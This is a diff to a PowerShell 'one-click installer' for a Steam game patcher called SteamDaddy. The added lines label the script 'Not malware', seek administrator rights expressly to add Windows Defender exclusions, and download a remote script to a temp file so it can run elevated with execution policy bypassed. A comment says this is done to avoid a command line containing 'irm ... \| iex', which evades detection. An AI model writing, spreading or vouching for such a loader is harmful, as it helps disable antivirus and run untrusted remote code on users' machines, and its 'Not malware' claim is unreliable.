@@ -1,21 +1,30 @@
-# SteamDaddy One-Click Installer
+# SteamDaddy One-Click Installer — github.com/Contrary7/SD-Backhups
+# Safe community patcher for Steam games. Not malware.
 $ErrorActionPreference = "Stop"
 
 # Ensure Administrator privileges so Defender exclusion calls succeed
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-    Write-Host "[SteamDaddy] Attempting to relaunch installer with Administrator privileges..." -ForegroundColor Yellow
+    Write-Host "[SteamDaddy] Requesting Administrator privileges for Defender exclusions..." -ForegroundColor Yellow
     try {
         if ($PSCommandPath) {
-            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
+            # Already a real file — just re-launch it elevated
+            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
             exit
         } else {
-            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Contrary7/SD-Backhups/main/install_b.ps1 | iex`"" -Verb RunAs -ErrorAction Stop
+            # Running from pipe (irm|iex) — save to temp file first, then re-launch with -File
+            # This avoids spawning a child process whose command line contains "irm ... | iex"
+            $tmpScript = Join-Path $env:TEMP "SteamDaddy_Install.ps1"
+            (New-Object System.Net.WebClient).DownloadFile(
+                "https://raw.githubusercontent.com/Contrary7/SD-Backhups/main/install_b.ps1",
+                $tmpScript
+            )
+            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmpScript`"" -Verb RunAs -ErrorAction Stop
             exit
         }
     } catch {
-        Write-Host "[SteamDaddy] Standard execution mode activated." -ForegroundColor Yellow
+        Write-Host "[SteamDaddy] Continuing without elevated permissions (some Defender exclusions may be skipped)." -ForegroundColor Yellow
     }
 }
 
